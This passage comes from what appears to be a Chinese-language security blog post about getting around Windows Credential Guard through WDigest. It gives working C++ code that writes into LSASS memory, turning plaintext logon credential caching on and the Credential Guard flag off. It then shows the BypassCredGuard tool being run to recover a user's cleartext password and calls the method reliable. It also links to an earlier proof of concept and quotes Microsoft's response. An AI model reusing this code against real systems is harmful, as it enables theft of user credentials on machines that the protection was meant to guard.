得到两个变量的地址后，`PatchMemory()` 函数开始修补这两的变量的值，其通过 `WriteProcessMemory()` 函数向指定变量的地址写入修改值，从而将 `g_fParameter_useLogonCredential` 变量的值设为 1，`g_IsCredGuardEnabled` 变量的值设为 0，如下所示。

```c++
BOOL PatchMemory()
{
	BOOL status = FALSE;
	DWORD dwCurrent;
	DWORD UseLogonCredential = 1;
	DWORD IsCredGuardEnabled = 0;

	status = AcquireLSA();
	if (status)
	{
		if (ReadProcessMemory(cLsass.hProcess, g_fParameter_UseLogonCredential, &dwCurrent, sizeof(DWORD), NULL))
		{
			wprintf(L"[*] The current value of g_fParameter_UseLogonCredential is %d\n", dwCurrent);
			if (WriteProcessMemory(cLsass.hProcess, g_fParameter_UseLogonCredential, (PVOID)&UseLogonCredential, sizeof(DWORD), NULL))
			{
				wprintf(L"[*] Patched value of g_fParameter_UseLogonCredential to 1\n");
				status = TRUE;
			}
			else
				wprintf(L"[-] Failed to WriteProcessMemory for g_fParameter_UseLogonCredential.\n");
		}
		else
			wprintf(L"[-] Failed to ReadProcessMemory for g_fParameter_UseLogonCredential\n");


		if (ReadProcessMemory(cLsass.hProcess, g_IsCredGuardEnabled, &dwCurrent, sizeof(DWORD), NULL))
		{
			wprintf(L"[*] The current value of g_IsCredGuardEnabled is %d\n", dwCurrent);
			if (WriteProcessMemory(cLsass.hProcess, g_IsCredGuardEnabled, (PVOID)&IsCredGuardEnabled, sizeof(DWORD), NULL))
			{
				wprintf(L"[*] Patched value of g_IsCredGuardEnabled to 0\n");
				status = TRUE;
			}
			else
				wprintf(L"[-] Failed to WriteProcessMemory for g_IsCredGuardEnabled.\n");
		}
		else
			wprintf(L"[-] Failed to ReadProcessMemory for g_IsCredGuardEnabled\n");
	}
	return status;
}
```

## Let’s see it in action

在启用了 Credential Guard 保护的系统上运行我们的 [BypassCredGuard](https://github.com/wh0Nsq/BypassCredGuard)，当用户输入用户名密码重新进行身份验证时，我们重新得到了他的明文密码，如下图所示。

```console
C:\Users\Administrator\Desktop> BypassCredGuard.exe
```

![](/assets/posts/2023-01-18-revisiting-a-credential-guard-bypass-from-wdigest/image-20230118230536164.png)
## Ending......

其实，早在 2020 年 8 月，Team Hydra（[@N4k3dTurtl3](https://twitter.com/N4k3dTurtl3)）就在博客上发布了一篇名为 [《Bypassing Credential Guard》](https://teamhydra.blog/2020/08/25/bypassing-credential-guard/) 的文章，对这个非常聪明和简单技巧进行了讨论，并简单公布了一个概念性的 [CredGuard_PoC](https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240)，不过它并不适用于所有的 Windows 系统。

Team Hydra 针对该问题向 Microsoft 提交了报告，并得到了以下回应：

> “After investigating this issue, we do not believe this is a Credential Guard bypass. Credential Guard is meant to protect credentials that were cached while the feature is enabled. If a privileged user disables Credential Guard, then the feature cannot protect subsequent logons. We’ll update our public documentation to clarify this behavior”

鉴于此回应，这也许是在启用 Credential Guard 保护的系统上获取明文凭据的可靠方法。